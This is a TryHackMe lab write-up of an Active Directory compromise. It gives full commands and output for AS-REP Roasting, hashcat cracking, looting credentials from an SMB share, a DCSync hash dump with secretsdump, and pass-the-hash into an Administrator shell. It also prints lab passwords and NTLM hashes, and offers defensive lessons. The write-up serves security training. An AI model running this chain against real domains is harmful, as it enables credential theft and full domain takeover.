# Attacktive Directory — TryHackMe — Medium

> **Date:** 2026-06-05\
> **Platform:** TryHackMe\
> **Difficulty:** Medium\
> **Tags:** `#windows` `#activedirectory` `#kerberos` `#asreproasting` `#dcsync` `#passthehash` `#impacket` `#evil-winrm`

---

## Summary

Windows Domain Controller running Active Directory. Initial enumeration revealed the domain `spookysec.local`. AS-REP Roasting against `svc-admin` (Kerberos pre-auth disabled) yielded an AS-REP encrypted response for offline password cracking. Credentials from a backup SMB share allowed a DCSync attack via secretsdump, dumping all NTLM hashes. Administrator access obtained via Pass-the-Hash with evil-winrm.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sV -sC -p- --min-rate 5000 -oN attacktive_nmap.txt 10.130.188.49
```

Open ports:

- 53: DNS — Simple DNS Plus
- 80: HTTP — Microsoft IIS 10.0
- 88: Kerberos → Domain Controller confirmed
- 139/445: SMB
- 389/3268: LDAP — Domain: `spookysec.local`
- 3389: RDP — `AttacktiveDirectory.spookysec.local`
- 5985: WinRM → evil-winrm access possible

Key info extracted:

- Domain: `spookysec.local`
- Hostname: `AttacktiveDirectory.spookysec.local`
- NetBIOS Domain: `THM-AD`
- OS: Windows Server 2019 (build 10.0.17763)

---

## Enumeration

### User Enumeration via AS-REP Roasting

```bash
cd /opt/impacket/examples
python3 GetNPUsers.py spookysec.local/ -dc-ip 10.130.188.49 -no-pass -usersfile /root/userlist.txt 2>/dev/null | grep -v "KDC_ERR"
```

Result: `svc-admin` has Kerberos pre-authentication disabled → AS-REP encrypted response returned

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:75691de96a3348cab50691f47fca8c12$...
```

---

## Exploitation

### Hash Cracking — AS-REP (mode 18200)

```bash
hashcat -m 18200 /root/hash.txt /usr/share/wordlists/rockyou.txt --force
```

Result:

```
svc-admin : management2005
```

### SMB Enumeration

```bash
smbclient -L \\\\10.130.188.49 -U spookysec.local/svc-admin%management2005
```

Shares discovered (6 total):

- `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` — standard
- `backup` — non-standard, accessible

### Backup Share Access

```bash
smbclient \\\\10.130.188.49\\backup -U spookysec.local/svc-admin%management2005
smb: \> get backup_credentials.txt
```

Content:

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoded:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

Result:

```
backup@spookysec.local:backup2517860
```

---

## Privilege Escalation

### DCSync via secretsdump (DRSUAPI method)

The `backup` account holds replication privileges on the DC, allowing a full DCSync attack:

```bash
cd /tmp
python3 /opt/impacket/examples/secretsdump.py -just-dc backup:backup2517860@10.130.188.49
```

Notable hashes extracted:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Notable accounts: `a-spooks` shares the same NTLM hash as `Administrator`, indicating password reuse. Matching password hashes do not establish group membership or administrator privileges.

### Pass-the-Hash → Domain Admin Shell

```bash
evil-winrm -i 10.130.188.49 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Result: Shell as `Administrator`

---

## Flags

```powershell
type "C:\Users\svc-admin\Desktop\user.txt.txt"
→ `THM{REDACTED}`

type "C:\Users\backup\Desktop\PrivEsc.txt"
→ `THM{REDACTED}`

type "C:\Users\Administrator\Desktop\root.txt"
→ `THM{REDACTED}`
```

---

## Lessons Learned

### 🔴 Côté Attaquant (Offensive)

- Port 88 ouvert = DC confirmé → tester AS-REP Roasting immédiatement → GetNPUsers.py sur une wordlist d'utilisateurs est le premier réflexe. Un compte avec UF_DONT_REQUIRE_PREAUTH permet de récupérer une réponse AS-REP pour tenter de casser le mot de passe hors ligne.
- Les shares SMB non-standards sont toujours prioritaires → ADMIN$, C$, SYSVOL sont standards et souvent inaccessibles. Un share custom comme backup est le vrai vecteur — toujours énumérer et tenter l'accès avec chaque set de credentials obtenu.
- Credentials en base64 dans un fichier = encoding, pas chiffrement → réflexe automatique : base64 -d sur tout blob suspect dans un share ou un fichier de config.
- DCSync (DRSUAPI) = dump complet de NTDS.DIT sans toucher le disque du DC → si un compte a des droits de réplication, secretsdump.py suffit pour extraire tous les hashes du domaine. Extrêmement discret en environnement réel.
- Pass-the-Hash bypass total → pas besoin du mot de passe en clair. Le hash NTLM suffit pour evil-winrm, smbclient, psexec. Toujours tenter PtH avant de cracker.
- Comptes partageant le même hash NTLM → `a-spooks` et `Administrator` réutilisent le même mot de passe. Vérifier séparément les groupes et droits de chaque compte avant de conclure qu'il est administrateur.


### 🔵 Côté Défenseur (Defensive / Blue Team)

- Désactiver la pré-authentification Kerberos uniquement si absolument nécessaire — chaque compte avec DONT_REQUIRE_PREAUTH est une cible AS-REP Roasting.
- Auditer les droits de réplication AD — seuls les DCs légitimes doivent avoir les privilèges DRSUAPI. Un compte backup avec ces droits est une misconfiguration critique.
- Ne jamais stocker des credentials dans des shares SMB, même encodés en base64.
- Monitorer les événements 4662 (accès objet AD avec droits de réplication) — signature directe d'un DCSync.
- Auditer les comptes partageant le même hash NTLM — indicateur de réutilisation de mot de passe à investiguer.

---

## Attack Chain Summary

```
nmap → port 88 (Kerberos) → spookysec.local DC
→ GetNPUsers → svc-admin (no pre-auth) → AS-REP hash
→ hashcat -m 18200 → management2005
→ smbclient → backup share → backup_credentials.txt
→ base64 decode → backup:backup2517860
→ secretsdump DRSUAPI → NTDS.DIT dump → Administrator NTLM hash
→ evil-winrm Pass-the-Hash → Domain Admin shell
```

---

## References

- TryHackMe - Attacktive Directory: https://tryhackme.com/room/attacktivedirectory
- HackTricks AS-REP Roasting: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
- HackTricks DCSync: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
- Impacket GitHub: https://github.com/fortra/impacket
- [GetNPUsers AS-REP export — Impacket source](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [Windows password storage — Microsoft](https://learn.microsoft.com/en-us/windows-server/security/kerberos/passwords-technical-overview)
